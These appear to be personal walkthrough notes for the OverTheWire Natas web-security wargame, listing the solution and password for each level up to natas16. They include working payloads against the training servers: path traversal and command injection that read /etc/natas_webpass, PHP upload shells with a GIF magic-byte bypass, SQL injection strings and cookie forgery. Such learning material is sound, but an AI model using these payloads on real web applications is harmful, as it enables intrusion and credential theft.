# [Natas](https://overthewire.org/wargames/natas)

## Quick Tips

* All passwords are in _/etc/natas\_webpass_
* [W3 Schools PHP compiler](https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler)
* [CyberChef](https://gchq.github.io/CyberChef) = build a sequence of converting, formatting, en/decoding

## Levels

* natas0 = login with given login/password, check source (**0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq**)
* natas1 = password is in source (**TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI**)
* natas2 = there's an image in _files_ directory so just go there to find password file (**3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH**)
* natas3 = source mentions Google, so check out _./robots.txt_, references _/s3cr3t_ folder (**QryZXc2e0zahULdHrtHxzyYkj59kUxLQ**)
* natas4
  * Either install a referer modifier browser extension to spoof referer URL to natas5
  * Or go to natas5 page and redirect via js console `location.assign("http://natas4.natas.labs.overthewire.org");` (**0n35PkggAPm2zbEpOU802c0x0Msn1ToK**)
* natas5 = edit cookie (**0RoJwHdSKWFTYR5WuiAewauSuNaBXned**)
* natas6
  * View source code, it references a secret-holding file in _includes/secret.inx_ (**FOEIUWGHFEEUHOFUOIU**)
  * Post that data (**bmg8SvU1LizuWjx3y7xkNERkHxGre0GS**)
* natas7
  * Hint in source reminds us where passwords are saved on the machine, and we can use unsanitized DT to access it
  * `index.php?page=/etc/natas_webpass/natas8` (**xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q**)
* natas8
  * Code Source, we must reverse encoded secret (**3d3d516343746d4d6d6c315669563362**)
  * hex2bin (not a binary number but a binary representation **==QcCtmMml1ViV3b**)
  * Reversed (**b3ViV1lmMmtCcQ==**)
  * Base 64 decode (**oubWYf2kBq**)
  * Paste that into form (**ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t**)
* natas9
  * Sourcecode reveals request argument is injected as-is & executed via _passthru_, so command inject
  * `. /etc/natas_webpass/natas10 #` (**t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu**)
* natas10
  * `. /etc/natas_webpass/natas11 #` (**UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk**)
* natas11
  * (Don't modify initial color _#ffffff_)
  * Fetch cookie _data_ & URL-decode it (**HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=**)
  * Take default array use `json_encode()` (**{"showpassword":"no","bgcolor":"#ffffff"}**)
    * Optional: `base64_encode()` it (**eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=** as seen in <https://learnhacking.io/overthewire-natas-level-11-walkthrough>)
  * As XOR is an associative operation, we can Base64-decode cookie and XOR it against default array json to get key (**eDWo**)
    * Use CyberChef with a _From Base64_ & a _XOR_ step, using default array json as (string-type) key
    * If we computed a Base64 value for json default array, we can also use it here as Base64 key (it will then get automatically decoded back to json, so unnecessary step really)
  * With key in hand, edit array to set _showpassword_ to _yes_ and XOR that json with (string-type, not Base64) key (**HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5**)
  * Edit cookie with that value (**yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB**)
* natas12
  * Sourcecode generates a random file name both as hidden input & server-side before it gets uploaded
  * There is no verification that a file really has a _.jpg_ extension anywhere
  * The extension from the hidden input is passed along and appears in the final file name
  * That means we can upload a file and change the extension in the input field name to something more php
  * (Also there is a 1000 bytes limit)
  * Create a file with this content `<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>`
  * Change its extension to _.php_ before uploading it (**trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**)
* natas13
  * Same as previous, but we need to pass the PHP `exif_imagetype()` checking method
  * See <https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack>
  * That can be achieved by spoofing a file's [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * Tried prepending some binary JPG & PNG signatures but they were rejected, however GIF format worked
  * Create a file (with any extension) and this content: `GIF87a <?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>`
  * Change its extension to _.php_ before uploading it (**z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ**)
* natas14
  * `" OR 1=1 #` or <code>" OR 1=1 -- </code> (notice the mandatory trailing space for MySQL to consider it an actual comment, **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**)
* natas15
  * `natas16` = displays a different result when user exists (blind boolean SQLi) so now we need his password
  * `natas16" AND STRCMP(password COLLATE utf8mb4_bin, 'h' COLLATE utf8mb4_bin) = 1 #` = brute-forcing it manually via dichotomic string comparison, but still going to take a while
  * Create a brute-force script that HTTP Post all password combinations (**hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**)
* natas16
  * ``` ; | & ` ' " ``` = cannot use one of those
* natas17
* natas18
* natas19
* natas20
* natas21
* natas22
* natas23
* natas24
* natas25
* natas26
* natas27
* natas28
* natas29
* natas30
